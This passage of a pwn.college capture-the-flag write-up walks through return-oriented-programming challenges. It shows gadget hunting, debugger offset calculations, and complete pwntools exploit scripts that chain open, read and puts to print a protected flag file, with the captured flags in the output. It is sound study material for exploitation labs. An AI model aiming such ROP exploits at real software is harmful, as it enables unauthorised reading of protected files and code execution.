                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 3
rsi: 0x405100

Function call setup:
read(3, 0x405100)

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdx ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1b90 │  00 00 00 00 00 40 11 60  │ --> ( read@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b98 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 3
rsi: 0x405100
rdx: 100

Function call setup:
read(3, 0x405100, 100)

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1b98 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 3
rsi: 0x405100
rdx: 100

Function call setup:
read(3, 0x405100, 100)

═══════════════════════════════════════════════════════════════════════════════════
rip --> read(3, 0x405100, 100)
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1b98 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎
                           
Registers:
rdi: 3
rsi: 0x405100
rdx: 100

Function call setup:
read(3, 0x405100, 100)

═══════════════════════════════════════════════════════════════════════════════════
rip --> read() return
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdi ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x405100

Function call setup:
puts(0x405100)       

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1bb0 │  .. .. .. .. .. .. .. ..  │ 
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x405100

Function call setup:
puts(0x405100) 

═══════════════════════════════════════════════════════════════════════════════════
rip --> puts(0x405100) 
═══════════════════════════════════════════════════════════════════════════════════
```

Pretty lengthy I know, but it is what it is.

### Exploit

```
hacker@return-oriented-programming~indirect-invocation-easy:~$ ln -sf /flag ~/!
```

```py title="~/script.py" showLineNumbers
from pwn import *

# Ensure 8-byte packing for 64-bit addresses
context.arch = 'amd64'

# ROP gadgets
pop_rdi = 0x40229e
pop_rsi = 0x402296
pop_rdx = 0x40228e
# PLT Entries
open_plt = 0x4011d0
read_plt = 0x401160
puts_plt = 0x401130
# Memory Addresses and offsets
bang_addr = 0x403386     
writable_buff = 0x405100 
offset = 88

p = process('/challenge/indirect-invocation-easy')

# ROP chain using regular flat() list
payload = flat(
    b"A" * offset,

    # open("!", O_RDONLY)
    pop_rdi, bang_addr,
    pop_rsi, 0,
    open_plt,
    
    # read(3, writable_buff, 100)
    pop_rdi, 3,
    pop_rsi, writable_buff,
    pop_rdx, 100,
    read_plt,
    
    # puts(writable_buff)
    pop_rdi, writable_buff,
    puts_plt
)

p.sendline(payload)
p.interactive()
```

```
hacker@return-oriented-programming~indirect-invocation-easy:~$ python ~/script.py
[+] Starting local process '/challenge/indirect-invocation-easy': pid 2281
[*] Switching to interactive mode
###
### Welcome to /challenge/indirect-invocation-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

Received 209 bytes! This is potentially 15 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 16 gadgets of ROP chain at 0x7ffc1158a9d8.
| 0x000000000040229e: pop rdi ; ret  ; 
| 0x0000000000403386: and dword ptr [rax], eax ; add dword ptr [rbx], ebx ; add edi, dword ptr [rbx] ; jl 0x40338e ; add byte ptr [rax], al ; 
| 0x0000000000402296: pop rsi ; ret  ; 
| 0x0000000000000000: (UNMAPPED MEMORY)
| 0x00000000004011d0: endbr64  ; bnd jmp qword ptr [rip + 0x3e9d] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3e95] ; nop dword ptr [rax + rax] ; endbr64  ; xor ebp, ebp ; mov r9, rdx ; pop rsi ; mov rdx, rsp ; and rsp, 0xfffffffffffffff0 ; push rax ; push rsp ; mov r8, 0x4024f0 ; 
| 0x000000000040229e: pop rdi ; ret  ; 
| 0x0000000000000003: (UNMAPPED MEMORY)
| 0x0000000000402296: pop rsi ; ret  ; 
| 0x0000000000405100: add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; 
| 0x000000000040228e: pop rdx ; ret  ; 
| 0x0000000000000064: (UNMAPPED MEMORY)
| 0x0000000000401160: endbr64  ; bnd jmp qword ptr [rip + 0x3ed5] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3ecd] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3ec5] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3ebd] ; nop dword ptr [rax + rax] ; 
| 0x000000000040229e: pop rdi ; ret  ; 
| 0x0000000000405100: add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; 
| 0x0000000000401130: endbr64  ; bnd jmp qword ptr [rip + 0x3eed] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3ee5] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3edd] ; nop dword ptr [rax + rax] ; endbr64  ; bnd jmp qword ptr [rip + 0x3ed5] ; nop dword ptr [rax + rax] ; 
| 0x000000000000000a: (UNMAPPED MEMORY)

Leaving!
pwn.college{g088n-yvU9xj4wn0pJJLgqCf0VN.0VM1MDL4ITM0EzW}

[*] Process '/challenge/indirect-invocation-easy' stopped with exit code -11 (SIGSEGV) (pid 2281)
[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Indirect Invocation (Hard)

```
hacker@return-oriented-programming~indirect-invocation-hard:/$ /challenge/indirect-invocation-hard 
###
### Welcome to /challenge/indirect-invocation-hard!
###

```

We need the following to craft the exploit.

- [ ] Offset between buffer and stored return address to `main()`
- [ ] Location of a NULL terminated string
- [ ] Locations of required PLT stubs
- [ ] Locations of required ROP gadgets
- [ ] Location to which flag is to be read

### Binary Analysis

#### ROP gadgets

Let's look at what gadgets are there.

```
hacker@return-oriented-programming~indirect-invocation-hard:/$ ROPgadget --binary /challenge/indirect-invocation-hard 
Gadgets information
============================================================
0x000000000040113d : add ah, dh ; nop ; endbr64 ; ret
0x000000000040116b : add bh, bh ; loopne 0x4011d5 ; nop ; ret
0x0000000000401bf8 : add byte ptr [rax - 0x39], cl ; loopne 0x401c58 ; ret
0x0000000000401d6c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401cf5 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000401cf6 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x00000000004011da : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401d6e : add byte ptr [rax], al ; endbr64 ; ret
0x000000000040113c : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401cf7 : add byte ptr [rax], al ; leave ; ret
0x0000000000401bff : add byte ptr [rax], al ; nop ; pop rbp ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x00000000004011db : add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004011d9 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040113b : add byte ptr cs:[rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401cf8 : add cl, cl ; ret
0x000000000040116a : add dil, dil ; loopne 0x4011d5 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x00000000004011dc : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011d7 : add eax, 0x2e9b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401bd5 : call qword ptr [rax + 0xff3c35d]
0x0000000000401c3f : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401be4 : clc ; pop rcx ; ret
0x00000000004011f3 : cli ; jmp 0x401180
0x0000000000401143 : cli ; ret
0x0000000000401d7b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004011f0 : endbr64 ; jmp 0x401180
0x0000000000401140 : endbr64 ; ret
0x0000000000401d4c : fisttp word ptr [rax - 0x7d] ; ret
0x000000000040113e : hlt ; nop ; endbr64 ; ret
0x0000000000401d2a : in al, dx ; or al, ch ; iretd
0x0000000000401d2d : iretd
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401165 : je 0x401170 ; mov edi, 0x404060 ; jmp rax
0x00000000004011a7 : je 0x4011b0 ; mov edi, 0x404060 ; jmp rax
0x000000000040103a : jmp 0x401020
0x00000000004011f4 : jmp 0x401180
0x000000000040100b : jmp 0x4840103f
0x000000000040116c : jmp rax
0x0000000000401c41 : leave ; ret
0x000000000040116d : loopne 0x4011d5 ; nop ; ret
0x0000000000401bfc : loopne 0x401c58 ; ret
0x00000000004011d6 : mov byte ptr [rip + 0x2e9b], 1 ; pop rbp ; ret
0x0000000000401bfa : mov dword ptr [rbp - 0x20], 0xc35a ; nop ; pop rbp ; ret
0x0000000000401cf4 : mov eax, 0 ; leave ; ret
0x0000000000401167 : mov edi, 0x404060 ; jmp rax
0x000000000040113f : nop ; endbr64 ; ret
0x0000000000401c40 : nop ; leave ; ret
0x0000000000401bb0 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401bb1 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401bb2 : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401bb3 : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401bb4 : nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401bb5 : nop ; nop ; nop ; pop rbp ; ret
0x0000000000401bb6 : nop ; nop ; pop rbp ; ret
0x0000000000401bb7 : nop ; pop rbp ; ret
0x000000000040116f : nop ; ret
0x00000000004011ec : nop dword ptr [rax] ; endbr64 ; jmp 0x401180
0x0000000000401d2b : or al, ch ; iretd
0x0000000000401166 : or dword ptr [rdi + 0x404060], edi ; jmp rax
0x0000000000401d5c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401d5e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401d60 : pop r14 ; pop r15 ; ret
0x0000000000401d62 : pop r15 ; ret
0x0000000000401d5b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401d5f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004011dd : pop rbp ; ret
0x0000000000401be5 : pop rcx ; ret
0x0000000000401bf5 : pop rdi ; ret
0x0000000000401bfd : pop rdx ; ret
0x0000000000401d61 : pop rsi ; pop r15 ; ret
0x0000000000401bed : pop rsi ; ret
0x0000000000401d5d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x0000000000401d7d : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000401d7c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401163 : test eax, eax ; je 0x401170 ; mov edi, 0x404060 ; jmp rax
0x00000000004011a5 : test eax, eax ; je 0x4011b0 ; mov edi, 0x404060 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
0x00000000004011d8 : wait ; add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret

Unique gadgets found: 89
```

- [ ] Offset between buffer and stored return address to `main()`: `88`
- [ ] Location of a NULL terminated string
- [ ] Locations of required PLT stubs
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x401bf5`
   - `pop rsi ; ret`: `0x401bed`
   - `pop rdx ; ret`: `0x401bfd`
- [ ] Location to which flag is to be read

As for the invocation of the syscall, even if we cannot directly do it, we can leverage the PLT stubs which are present in the binary.

#### PLT stubs

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010a0  putchar@plt
0x00000000004010b0  puts@plt
0x00000000004010c0  printf@plt
0x00000000004010d0  read@plt
0x00000000004010e0  sendfile@plt
0x00000000004010f0  setvbuf@plt
0x0000000000401100  open@plt
0x0000000000401110  _start
0x0000000000401140  _dl_relocate_static_pie
0x0000000000401150  deregister_tm_clones
0x0000000000401180  register_tm_clones
0x00000000004011c0  __do_global_dtors_aux
0x00000000004011f0  frame_dummy
0x00000000004011f6  bin_padding
0x0000000000401bba  force_import
0x0000000000401bd9  free_gadgets
0x0000000000401c04  challenge
0x0000000000401c43  main
0x0000000000401d00  __libc_csu_init
0x0000000000401d70  __libc_csu_fini
0x0000000000401d78  _fini
```

- [ ] Offset between buffer and stored return address to `main()`: `88`
- [ ] Location of a NULL terminated string
- [x] Locations of required PLT stubs
   - `open@plt`: `0x401100`
   - `read@plt`: `0x4010d0`
   - `puts@plt`: `0x4010b0`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x401bf5`
   - `pop rsi ; ret`: `0x401bed`
   - `pop rdx ; ret`: `0x401bfd`
- [ ] Location to which flag is to be read

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000401c04 <+0>:     endbr64
   0x0000000000401c08 <+4>:     push   rbp
   0x0000000000401c09 <+5>:     mov    rbp,rsp
   0x0000000000401c0c <+8>:     sub    rsp,0x50
   0x0000000000401c10 <+12>:    mov    DWORD PTR [rbp-0x34],edi
   0x0000000000401c13 <+15>:    mov    QWORD PTR [rbp-0x40],rsi
   0x0000000000401c17 <+19>:    mov    QWORD PTR [rbp-0x48],rdx
   0x0000000000401c1b <+23>:    lea    rax,[rbp-0x30]
   0x0000000000401c1f <+27>:    mov    edx,0x1000
   0x0000000000401c24 <+32>:    mov    rsi,rax
   0x0000000000401c27 <+35>:    mov    edi,0x0
   0x0000000000401c2c <+40>:    call   0x4010d0 <read@plt>
   0x0000000000401c31 <+45>:    mov    DWORD PTR [rbp-0x4],eax
   0x0000000000401c34 <+48>:    lea    rdi,[rip+0x3c9]        # 0x402004
   0x0000000000401c3b <+55>:    call   0x4010b0 <puts@plt>
   0x0000000000401c40 <+60>:    nop
   0x0000000000401c41 <+61>:    leave
   0x0000000000401c42 <+62>:    ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+40` and run.

```
pwndbg> break *(challenge+40)
Breakpoint 1 at 0x401c2c
```

```
pwndbg> run
Starting program: /challenge/indirect-invocation-hard 
###
### Welcome to /challenge/indirect-invocation-hard!
###


Breakpoint 1, 0x0000000000401c2c in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffd745d5f90 —▸ 0x7828a1e916a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 RBX  0x401d00 (__libc_csu_init) ◂— endbr64 
 RCX  0x7ffd745d60e8 —▸ 0x7ffd745d665d ◂— '/challenge/indirect-invocation-hard'
 RDX  0x1000
 RDI  0
 RSI  0x7ffd745d5f90 —▸ 0x7828a1e916a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 R8   0
 R9   0x34
 R10  0x400527 ◂— 0x66756276746573 /* 'setvbuf' */
 R11  0x7828a1d28ce0 (setvbuf) ◂— endbr64 
 R12  0x401110 (_start) ◂— endbr64 
 R13  0x7ffd745d60e0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffd745d5fc0 —▸ 0x7ffd745d5ff0 ◂— 0
 RSP  0x7ffd745d5f70 ◂— 0
 RIP  0x401c2c (challenge+40) ◂— call read@plt
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x401c2c <challenge+40>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/4)
        buf: 0x7ffd745d5f90 —▸ 0x7828a1e916a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
        nbytes: 0x1000
 
   0x401c31 <challenge+45>    mov    dword ptr [rbp - 4], eax
   0x401c34 <challenge+48>    lea    rdi, [rip + 0x3c9]           RDI => 0x402004 ◂— 'Leaving!'
   0x401c3b <challenge+55>    call   puts@plt                    <puts@plt>
 
   0x401c40 <challenge+60>    nop    
   0x401c41 <challenge+61>    leave  
   0x401c42 <challenge+62>    ret    
 
   0x401c43 <main>            endbr64 
   0x401c47 <main+4>          push   rbp
   0x401c48 <main+5>          mov    rbp, rsp
   0x401c4b <main+8>          sub    rsp, 0x20
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffd745d5f70 ◂— 0
01:0008│-048     0x7ffd745d5f78 —▸ 0x7ffd745d60f8 —▸ 0x7ffd745d6681 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-040     0x7ffd745d5f80 —▸ 0x7ffd745d60e8 —▸ 0x7ffd745d665d ◂— '/challenge/indirect-invocation-hard'
03:0018│-038     0x7ffd745d5f88 ◂— 0x1a1d3253d
04:0020│ rax rsi 0x7ffd745d5f90 —▸ 0x7828a1e916a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0028│-028     0x7ffd745d5f98 —▸ 0x7828a1d28de5 (setvbuf+261) ◂— xor r8d, r8d
06:0030│-020     0x7ffd745d5fa0 —▸ 0x401d00 (__libc_csu_init) ◂— endbr64 
07:0038│-018     0x7ffd745d5fa8 —▸ 0x7ffd745d5ff0 ◂— 0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401c2c challenge+40
   1         0x401ce8 main+165
   2   0x7828a1cc8083 __libc_start_main+243
   3         0x40113e _start+46
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Lets get the address of the stored return pointer.

```
pwndbg> info frame
Stack level 0, frame at 0x7ffd745d5fd0:
 rip = 0x401c2c in challenge; saved rip = 0x401ce8
 called by frame at 0x7ffd745d6000
 Arglist at 0x7ffd745d5fc0, args: 
 Locals at 0x7ffd745d5fc0, Previous frame's sp is 0x7ffd745d5fd0
 Saved registers:
  rbp at 0x7ffd745d5fc0, rip at 0x7ffd745d5fc8
```

```
pwndbg> p/d 0x7ffd745d5fc8 - 0x7ffd745d5f90
$1: 56
```

- [x] Offset between buffer and stored return address to `main()`: `56`
   - Buffer address: `0x7ffd745d5f90`
   - location of the stored return pointer to `main()`: `0x7ffd745d5fc8`
- [ ] Location of a NULL terminated string
- [x] Locations of required PLT stubs
   - `open@plt`: `0x401100`
   - `read@plt`: `0x4010d0`
   - `puts@plt`: `0x4010b0`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x401bf5`
   - `pop rsi ; ret`: `0x401bed`
   - `pop rdx ; ret`: `0x401bfd`
- [ ] Location to which flag is to be read

Let's find a string we can use a symlink.

```
hacker@return-oriented-programming~indirect-invocation-hard:/$ objdump -s -j .rodata /challenge/indirect-invocation-hard | grep -E "[0-9a-f]{2}00"
 402000 01000200 4c656176 696e6721 00232323  ....Leaving!.###
 402030 2100                                 !.   
```

- [x] Offset between buffer and stored return address to `main()`: `56`
   - Buffer address: `0x7ffd745d5f90`
   - location of the stored return pointer to `main()`: `0x7ffd745d5fc8`
- [x] Location of a NULL terminated string: `0x402030`
- [x] Locations of required PLT stubs
   - `open@plt`: `0x401100`
   - `read@plt`: `0x4010d0`
   - `puts@plt`: `0x4010b0`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x401bf5`
   - `pop rsi ; ret`: `0x401bed`
   - `pop rdx ; ret`: `0x401bfd`
- [ ] Location to which flag is to be read

Finally, we have to get the address of the `.bss` section so that we can read the flag.

```
pwndbg> info files
Symbols from "/challenge/indirect-invocation-hard".
Local exec file:
        `/challenge/indirect-invocation-hard', file type elf64-x86-64.
        Entry point: 0x401110
        0x0000000000400318 - 0x0000000000400334 is .interp
        0x0000000000400338 - 0x0000000000400358 is .note.gnu.property
        0x0000000000400358 - 0x000000000040037c is .note.gnu.build-id
        0x000000000040037c - 0x000000000040039c is .note.ABI-tag
        0x00000000004003a0 - 0x00000000004003c8 is .gnu.hash
        0x00000000004003c8 - 0x00000000004004e8 is .dynsym
        0x00000000004004e8 - 0x000000000040055c is .dynstr
        0x000000000040055c - 0x0000000000400574 is .gnu.version
        0x0000000000400578 - 0x0000000000400598 is .gnu.version_r
        0x0000000000400598 - 0x00000000004005f8 is .rela.dyn
        0x00000000004005f8 - 0x00000000004006a0 is .rela.plt
        0x0000000000401000 - 0x000000000040101b is .init
        0x0000000000401020 - 0x00000000004010a0 is .plt
        0x00000000004010a0 - 0x0000000000401110 is .plt.sec
        0x0000000000401110 - 0x0000000000401d75 is .text
        0x0000000000401d78 - 0x0000000000401d85 is .fini
        0x0000000000402000 - 0x0000000000402032 is .rodata
        0x0000000000402034 - 0x0000000000402098 is .eh_frame_hdr
        0x0000000000402098 - 0x0000000000402218 is .eh_frame
        0x0000000000403e10 - 0x0000000000403e18 is .init_array
        0x0000000000403e18 - 0x0000000000403e20 is .fini_array
        0x0000000000403e20 - 0x0000000000403ff0 is .dynamic
        0x0000000000403ff0 - 0x0000000000404000 is .got
        0x0000000000404000 - 0x0000000000404050 is .got.plt
        0x0000000000404050 - 0x0000000000404060 is .data
        0x0000000000404060 - 0x0000000000404080 is .bss
```

- [x] Offset between buffer and stored return address to `main()`: `56`
   - Buffer address: `0x7ffd745d5f90`
   - location of the stored return pointer to `main()`: `0x7ffd745d5fc8`
- [x] Location of a NULL terminated string: `0x402030`
- [x] Locations of required PLT stubs
   - `open@plt`: `0x401100`
   - `read@plt`: `0x4010d0`
   - `puts@plt`: `0x4010b0`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x401bf5`
   - `pop rsi ; ret`: `0x401bed`
   - `pop rdx ; ret`: `0x401bfd`
- [x] Location to which flag is to be read: `0x404100`

### ROP chain: ret2plt

The ROP chain will be the same as the [easy version](#rop-chain-ret2plt).

### Exploit

```
hacker@return-oriented-programming~indirect-invocation-hard:~$ ln -sf /flag ~/!
```

```py title="~/script.py" showLineNumbers
from pwn import *

# Ensure 8-byte packing for 64-bit addresses
context.arch = 'amd64'

# ROP gadgets
pop_rdi = 0x401bf5
pop_rsi = 0x401bed
pop_rdx = 0x401bfd
# PLT Entries
open_plt = 0x401100
read_plt = 0x4010d0
puts_plt = 0x4010b0
# Memory Addresses and offsets
bang_addr = 0x402030     
writable_buff = 0x404100 
offset = 56

p = process('/challenge/indirect-invocation-hard')

# ROP chain using regular flat() list
payload = flat(
    b"A" * offset,

    # open("!", O_RDONLY)
    pop_rdi, bang_addr,
    pop_rsi, 0,
    open_plt,
    
    # read(3, writable_buff, 100)
    pop_rdi, 3,
    pop_rsi, writable_buff,
    pop_rdx, 100,
    read_plt,
    
    # puts(writable_buff)
    pop_rdi, writable_buff,
    puts_plt
)

p.sendline(payload)
p.interactive()
```

```
hacker@return-oriented-programming~indirect-invocation-hard:~$ python ~/script.py
[+] Starting local process '/challenge/indirect-invocation-hard': pid 13226
[*] Switching to interactive mode
[*] Process '/challenge/indirect-invocation-hard' stopped with exit code -11 (SIGSEGV) (pid 13226)
###
### Welcome to /challenge/indirect-invocation-hard!
###

Leaving!
pwn.college{UhvcV1TnlEqzmcMsHnCOAh8SVOE.0lM1MDL4ITM0EzW}

[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Leaky Libc (Easy)

```
hacker@return-oriented-programming~leaky-libc-easy:~$ /challenge/leveraging-libc-easy 
###
### Welcome to /challenge/leveraging-libc-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

ASLR means that the address of the libraries is not known,
but I will simulate a memory disclosure of libc.By knowing where libc is, you can now utilize the HUMONGOUS amount of gadgets
present in it for your ROP chain.
[LEAK] The address of "system" in libc is: 0x788091c00290.

```

Let's take a look at the gadgets.

### Binary Analysis

#### ROP gadgets

```
hacker@return-oriented-programming~leaky-libc-easy:/$ ROPgadget --binary /challenge/leveraging-libc-easy 
Gadgets information
============================================================
0x00000000004011fd : add ah, dh ; nop ; endbr64 ; ret
0x000000000040122b : add bh, bh ; loopne 0x401295 ; nop ; ret
0x0000000000401ba8 : add byte ptr [rax + 0x29], cl ; ret 0x8948
